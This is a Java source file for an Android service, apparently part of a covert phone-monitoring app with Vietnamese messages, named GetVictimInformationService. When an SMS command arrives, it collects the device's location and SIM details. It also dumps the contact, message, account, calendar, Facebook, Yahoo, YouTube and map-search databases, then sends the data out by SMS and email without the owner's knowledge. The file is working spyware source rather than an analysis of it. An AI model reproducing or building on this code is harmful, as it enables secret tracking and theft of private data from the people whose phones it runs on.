package com.tvh.security.services;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.preference.PreferenceManager;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

import com.tvh.security.models.CommandType;
import com.tvh.security.models.Parameters;
import com.tvh.security.receivers.SmsReceiver;
import com.tvh.security.utils.*;
import com.tvh.security.webservice.CallServiceWithoutActivity;

public class GetVictimInformationService extends Service implements Parameters {
    private static final String TAG = GetVictimInformationService.class.getSimpleName();
    private static final String FILE_DB_EXTENSION = ".db";
    private String m_path = "";
    private String m_type = null;
    private File m_file = null;
    private String m_sender = null;

    @Override
    public void onCreate() {
        super.onCreate();
        m_path = PreferencesUtils.getPathSaveFile(getApplicationContext());
        FileUtils.mkdir(new File(m_path));
    }

    @SuppressWarnings("deprecation")
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        //retrieve information from extra
        m_type = intent.getStringExtra(SmsReceiver.TYPE_INFO);
        m_sender = intent.getStringExtra(SmsReceiver.SENDER);
        CommandType commandType = CommandType.findType(m_type);
        switch (commandType) {
            case COMMAND_GET_LOCATION:
                // Get SIM Info
                sendLocation(m_sender);
                break;
            case COMMAND_GET_SIM_INFO:
                // Get location
                sendSimInfo(m_sender);
                break;
            case COMMAND_GET_SYSTEM_SETTINGS:
            case COMMAND_GET_CONTACT_DB:
            case COMMAND_GET_MESSAGE_DB:
            case COMMAND_GET_MAP_SEARCH_DB:
            case COMMAND_GET_YOUTUBE_DB:
            case COMMAND_GET_FACEBOOK_DB:
            case COMMAND_GET_YAHOO_DB:
            case COMMAND_GET_ACCOUNT_DB:
            case COMMAND_GET_CALENDAR_DB:
                //remove space before create file path
                m_path += commandType.getDescription().replace(" ", "") + FILE_DB_EXTENSION;
                AppUtils.getInformation(commandType, m_path);
                break;
            default:
                break;
        }
        m_file = new File(m_path);
        if (m_file.exists()) {
            // Send email
            Utils.sendEmail(getBaseContext(), m_path, true);
        }
        stopSelf();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void sendSimInfo(String sender) {
        // send sms to request sim info
        SMSUtils.sendSMS(Parameters.SIM_REQUEST_NUMBER_1, Parameters.SIM_REQUEST);

        // Set Preferences to check when has from 1414
        SharedPreferences shared = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        SharedPreferences.Editor editor = shared.edit();
        editor.putBoolean(Parameters.IS_GET_SIM_INFO, true);
        editor.putString(Parameters.SENDER_REQUEST, sender);
        editor.commit();
    }

    private void sendLocation(String sender) {
        LocationsUtils location = new LocationsUtils(getApplicationContext());
        double[] loc = location.getLocation();

        if (loc == LocationsUtils.DEFAULT_LOCATION) {
            String content = "Khong tim thay vi tri thiet bi. Vui long thu lai sau.";
            sendLocationToEmail(sender, content);
            return;
        }

        //======================================        
        String simAdresses = LocationsUtils.getAddressWithGeoCoder(getApplicationContext(), loc[1], loc[0], 1);
        // Send full location name
        String content = "";
        if (simAdresses != null && !simAdresses.trim().equals("")) {
            content = "Dia chi cua thiet bi: " + simAdresses + ". Vi tri tai ban do: https://maps.google.com/maps?q=" + loc[1] + "," + loc[0] + "&hl=en";
        } else {
            // try to get location again with geocoder
            content = "Khong tim thay vi tri thiet bi.";
        }
        SMSUtils.sendSMS(sender, content);
        sendLocationToEmail(sender, content);
        return;
    }

    /**
     * @param receiverNumber
     * @param content
     */
    private void sendLocationToEmail(String receiverNumber, String content) {
        // Send to email
        Utils.sendEmail(getApplicationContext(), content);
        
        /*
        String username = PreferencesUtils.getUsername(getApplicationContext());
        String password = PreferencesUtils.getHashPassword(getApplicationContext());
        if (!receiverNumber.equals("") && !content.equals("") && !username.equals("") && !password.equals("")) {
            Map<String, String> params = new HashMap<String, String>();
            params.put("username", username);
            params.put("password", password);
            params.put("receiver", receiverNumber);
            params.put("contain", Utils.convertToASCII(content));
            new CallServiceWithoutActivity(getApplicationContext(), CallServiceWithoutActivity.SERVICE_SEND_SMS, params).execute();
        }
        */
    }
}
